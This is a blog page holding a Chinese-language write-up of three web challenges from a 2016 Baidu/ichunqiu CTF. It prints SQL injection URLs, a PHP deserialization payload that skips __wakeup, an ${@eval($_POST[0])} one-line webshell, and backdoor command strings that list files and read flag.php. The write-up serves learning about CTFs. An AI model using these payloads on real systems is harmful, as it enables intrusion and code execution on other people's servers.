@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="x-man" />
+
+
+
+<meta name="description" content="WriteUp for Baidu on ichunqiu,10月29号">
+<meta property="og:type" content="article">
+<meta property="og:title" content="baidu-CTF-10月-第四场">
+<meta property="og:url" content="http://yoursite.com/2016/11/15/baidu-CTF-10月-第四场/index.html">
+<meta property="og:site_name" content="x-man's blog">
+<meta property="og:description" content="WriteUp for Baidu on ichunqiu,10月29号">
+<meta property="og:image" content="http://yoursite.com/img/ctf/baiductf-10-fourth/1.png">
+<meta property="og:image" content="http://yoursite.com/img/ctf/baiductf-10-fourth/2.png">
+<meta property="og:image" content="http://yoursite.com/img/ctf/baiductf-10-fourth/3.png">
+<meta property="og:image" content="http://yoursite.com/img/ctf/baiductf-10-fourth/4.png">
+<meta property="og:image" content="http://yoursite.com/img/ctf/baiductf-10-fourth/5.png">
+<meta property="og:image" content="http://yoursite.com/img/ctf/baiductf-10-fourth/6.png">
+<meta property="og:image" content="http://yoursite.com/img/ctf/baiductf-10-fourth/7.png">
+<meta property="og:image" content="http://yoursite.com/img/ctf/baiductf-10-fourth/8.png">
+<meta property="og:image" content="http://yoursite.com/img/ctf/baiductf-10-fourth/9.png">
+<meta property="og:updated_time" content="2016-11-15T13:39:02.135Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="baidu-CTF-10月-第四场">
+<meta name="twitter:description" content="WriteUp for Baidu on ichunqiu,10月29号">
+<meta name="twitter:image" content="http://yoursite.com/img/ctf/baiductf-10-fourth/1.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="x-man&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>baidu-CTF-10月-第四场 | x-man&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: undefined
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">x-man</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">为伊消得人憔悴</p>
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ajax/">Ajax</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nginx/">Nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XMLHttpRequest/">XMLHttpRequest</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/baidu/">baidu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/blog/">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hmm/">hmm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ichunqiu/">ichunqiu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lua/">lua</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入，报错注入/">sql注入，报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/thread/">thread</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wechall/">wechall</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端/">前端</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/浏览器安全/">浏览器安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/绕过/">绕过</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/面试/">面试</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于web安全</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">x-man</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">x-man</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">为伊消得人憔悴</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-baidu-CTF-10月-第四场" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/11/15/baidu-CTF-10月-第四场/" class="article-date">
+      <time datetime="2016-11-15T07:51:05.000Z" itemprop="datePublished">2016-11-15</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      baidu-CTF-10月-第四场
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/baidu/">baidu</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ichunqiu/">ichunqiu</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="Try"><a href="#Try" class="headerlink" title="Try"></a>Try</h2><p>这是一个改密码的题目<br>查看源代码有个注释 reset.php<br><a href="http://e24890cb606846708221a491cd15d6a2e983c17bacc24676.game.ichunqiu.com/level.php?name=guest" target="_blank" rel="external">http://e24890cb606846708221a491cd15d6a2e983c17bacc24676.game.ichunqiu.com/level.php?name=guest</a>‘ or ‘1’=’1<br><a href="http://e24890cb606846708221a491cd15d6a2e983c17bacc24676.game.ichunqiu.com/level.php?name=guest" target="_blank" rel="external">http://e24890cb606846708221a491cd15d6a2e983c17bacc24676.game.ichunqiu.com/level.php?name=guest</a>‘ or ‘1’=’2<br>存在注入，可以使用OPTIONS请求突破<br>这里直接使用sqlmap来跑<br><img src="/img/ctf/baiductf-10-fourth/1.png" alt=""><br>user表有2个用户guest member，token表为空<br>dump数据发现guest为空 就拿member来测试<br>reset.php 源代码有提示<br><img src="/img/ctf/baiductf-10-fourth/2.png" alt=""><br>这里去搜了下类似的格式<br>在php官网上找到能生成类似结果的加密函数<br><img src="/img/ctf/baiductf-10-fourth/3.png" alt=""><br>顿折腾发现第二个参数为$6$rounds=66 能生成一样的hash<br><img src="/img/ctf/baiductf-10-fourth/4.png" alt=""><br>reset.php 账号填member 尝试重置 reset_do.php<br>然后通过注入查询token<br>发现hash会变 并且格式和提示的一样 这里通过没法爆破发现只要reset_do.php提交的token一旦错误就会清空数据表<br>本地通过python脚本生成一份hash表 （这里不要全生成需要花费太多时间）<br><img src="/img/ctf/baiductf-10-fourth/5.png" alt=""><br>思路：<br>通过reset.php重置再通过注入获取token 接着把token放到hash表中查找 如果有对应的明文则是token 否则继续重置 然后重复<br>脚本如下：<br><img src="/img/ctf/baiductf-10-fourth/6.png" alt=""><br>接着挂机去跑就行了 如果2000次没跑出来重复跑 如果生成的hash表数据足够多几率就越高<br>得到token后去重置密码，然后登陆返回Get_Fl3g_e165421110ba03099a1c0393373c5b43.php源代码注释提示<!--backup file .txt--> 备份文件Get_Fl3g_e165421110ba03099a1c0393373c5b43.txt<br>这里一个循环$_GET $_POST $_COOKIE 注册变量如果key 为_SESSION会跳过但是这里$_SERVER没有进行检查key 最终检查$_SESSION[admin]为yes这回打印flag利用没有检查$_SERVER的key 可以通过上面的get post cookie来注册个二维数组来跳过前面的key检查 然后到循环$_SERVER再进行一次注册给$_SESSION来赋值<br>Get_Fl3g_e165421110ba03099a1c0393373c5b43.php?_SERVER[_SESSION][admin]=yes，得到flag</p>
+<h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><p>这题考察的是php反序列化命令执行<br>访问超链接，发现MD5，解密为kkkkkk01123，把hash改为kkkkkk01admin，把key改为admin，访问得到next step is Gu3ss_m3_h2h2.php 访问<br><img src="/img/ctf/baiductf-10-fourth/7.png" alt=""><br>接受一个var参数base64解码然后正则匹配如果匹配到程序结束执行 否则就进行反序列化可以发现是一个文件读取类 但是会在执行<strong>destruct之前会调用</strong>wakeup来修改掉file变量这里利用一个php的bug简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 然后绕过正则的话我们可以在对象长度前加一个 + 号<a href="http://www.milw0rm.cn/Article/exploit/20160915/vulzone-26.html然后生成一下payload" target="_blank" rel="external">http://www.milw0rm.cn/Article/exploit/20160915/vulzone-26.html然后生成一下payload</a><br>注意var=O:+4:”Demo”:2:{s:10:”%00Demo%00file”;s:16:”f15g_1s_here.php”;}   其中的%00要进行url解码<br><img src="/img/ctf/baiductf-10-fourth/8.png" alt=""><br>var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==<br>得到源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"> <span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'val'</span>])) &#123;</div><div class="line">    $val = $_GET[<span class="string">'val'</span>];</div><div class="line">    <span class="keyword">eval</span>(<span class="string">'$value="'</span> . addslashes($val) . <span class="string">'";'</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'hahaha!'</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>接受一个参数val 然后eval参数是进行变量赋值 这里payload是${phpinfo()} 或者${${phpinfo()}}可以执行phpinfo 改成一句话${@eval($_POST[0])} 然后post突破WAF执行代码<br><img src="/img/ctf/baiductf-10-fourth/9.png" alt=""></p>
+<h2 id="Nothing"><a href="#Nothing" class="headerlink" title="Nothing"></a>Nothing</h2><p>下载安装docker，导入，运行，开始到处找信息<br>然后翻web目录 .info.php发现是个phpinfo猜测一般套路 是写了个扩展后门 grep backdoor 发现是个扩展，之后<br>查看php.ini<br>在php.ini中有一个外部扩展，逆向一下，或者strings查看一下可见字符，或者网上找一个后门文件，进行对比<br>发现是$_POST[‘string’],命令执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">string=echo `ls /var/www/html`;</div><div class="line">string=echo `cat /var/www/html/flag.php`;</div></pre></td></tr></table></figure></p>
+<p>得到flag</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/11/15/baidu-CTF-10月-第四场/">baidu-CTF-10月-第四场</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">x-man</a></p>
+        <p><span>发布时间:</span>2016-11-15, 15:51:05</p>
+        <p><span>最后更新:</span>2016-11-15, 21:39:02</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/11/15/baidu-CTF-10月-第四场/" title="baidu-CTF-10月-第四场">http://yoursite.com/2016/11/15/baidu-CTF-10月-第四场/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2016/11/15/baidu-CTF-10月-第四场/　　作者: x-man" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2016/11/15/python异常整理/">
+                    python异常整理
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/11/15/baidu-CTF-10月-第三场/">
+                    baidu-CTF-10月-第三场
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Try"><span class="toc-number">1.</span> <span class="toc-text">Try</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hash"><span class="toc-number">2.</span> <span class="toc-text">Hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nothing"><span class="toc-number">3.</span> <span class="toc-text">Nothing</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"baidu-CTF-10月-第四场　| x-man's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <div id="comment-box" ></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2016/11/15/baidu-CTF-10月-第四场/" data-title="baidu-CTF-10月-第四场" data-url="http://yoursite.com/2016/11/15/baidu-CTF-10月-第四场/"></div>
+    <script>
+        var duoshuoQuery = {short_name:"x-man"};
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+            s.async = true; s.charset = 'UTF-8';
+            (d.head || d.body).appendChild(s);
+        }
+
+        
+    </script>
+    
+    <script> loadComment(); </script>
+
+</div>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/11/15/python异常整理/" title="上一篇: python异常整理">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/11/15/baidu-CTF-10月-第三场/" title="下一篇: baidu-CTF-10月-第三场">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/11/19/baidu面试题整理/">baidu面试题整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/18/ssrf漏洞总结/">ssrf漏洞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/17/hmm代码实现/">hmm代码实现</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/15/linux中的几个命令/">linux中的几个命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/15/python异常整理/">python异常整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/15/baidu-CTF-10月-第四场/">baidu-CTF-10月-第四场</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/15/baidu-CTF-10月-第三场/">baidu-CTF-10月-第三场</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/15/baidu-CTF-10月-第二场/">baidu-CTF-10月-第二场</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/15/baidu-CTF-11月-第二场/">baidu-CTF-11月-第二场</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/python集合总结/">python集合总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/lua学习笔记/">lua学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/02/requests模块整理/">requests模块整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/02/python变量作用域说明/">python变量作用域说明</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/01/python线程总结/">python线程总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/01/Nginx配置指令的执行顺序/">Nginx配置指令的执行顺序</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/01/Nginx源码安装/">Nginx源码安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/31/Nginx内置的与http相关的变量/">Nginx内置的与http相关的变量</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/27/sql注入常用语句整理/">sql注入常用语句整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/26/python-执行系统命令/">python-执行系统命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/18/报错注入总结/">报错注入总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/18/sql-inject-attact-绕过/">sql-inject-attact-绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/浏览器本地文件读取及远程命令执行/">浏览器本地文件读取及远程命令执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/baidu-CTF-10月-第一场/">baidu-CTF-10月-第一场</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/10/Nginx变量漫谈/">Nginx变量漫谈</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/27/baidu-CTF-3/">baidu CTF 3</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/27/baidu-CTF-2/">baidu CTF 2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/23/Ajax-Security/">Ajax Security</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/03/baidu-CTF-1/">baidu CTF 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/24/wechall-writeup-about-Crypto/">wechall writeup about Crypto</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/13/my-blog-is-ok/">my blog is ok</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/13/hello-world/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2017 x-man
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
